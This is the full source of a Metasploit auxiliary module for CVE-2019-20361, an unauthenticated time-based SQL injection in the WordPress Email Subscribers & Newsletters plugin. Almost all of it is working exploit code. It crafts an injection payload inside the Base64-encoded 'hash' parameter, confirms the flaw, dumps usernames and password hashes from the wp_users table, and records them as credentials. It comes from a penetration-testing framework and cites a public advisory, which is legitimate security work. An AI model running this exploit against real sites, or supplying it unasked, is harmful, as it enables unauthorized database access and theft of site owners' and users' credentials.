##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi
  require 'metasploit/framework/hashes/identify'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Email Subscribers and Newsletter Hash SQLi Scanner',
        'Description' => %q{
          Email Subscribers & Newsletters plugin contains an unauthenticated timebased SQL injection in
          versions before 4.3.1.  The hash parameter is vulnerable to injection.
        },
        'Author' => [
          'h00die', # msf module
          'red0xff', # sqli libs in msf
          'Wordfence' # blog post says team, no individual(s) called out for discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'EDB', '48699' ],
          [ 'CVE', '2019-20361' ],
          [ 'URL', 'https://www.wordfence.com/blog/2019/11/multiple-vulnerabilities-patched-in-email-subscribers-newsletters-plugin/' ]
        ],
        'Actions' => [
          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2019-11-13'
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1])
    ]
  end

  def run_host(ip)
    unless wordpress_and_online?
      fail_with Failure::NotVulnerable, 'Server not online or not detected as wordpress'
    end

    checkcode = check_plugin_version_from_readme('email-subscribers', '4.3.1')
    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
      fail_with Failure::NotVulnerable, 'Email subscribers and newsletter version not vulnerable'
    end
    print_good('Vulnerable version detected')

    guid = Rex::Text.rand_guid
    email = Rex::Text.rand_mail_address

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      data = %|{"contact_id":"100','100','100','3'),('1594999398','1594999398','1',(1) AND #{payload},'100','100','3'),|
      data << %|('1594999398','1594999398','1','100","campaign_id":"100","message_id":"100","email":"#{email}","guid":"#{guid}","action":"open"}|

      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'vars_get' => {
          'hash' => Base64.strict_encode64(data),
          'es' => 'open'
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end
    unless @sqli.test_vulnerable
      fail_with Failure::PayloadFailed, "#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay."
    end

    columns = ['user_login', 'user_pass']
    results = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])
    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
    results.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(user[1]),
        private_data: user[1],
        service_name: 'Wordpress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good(table.to_s)
  end
end
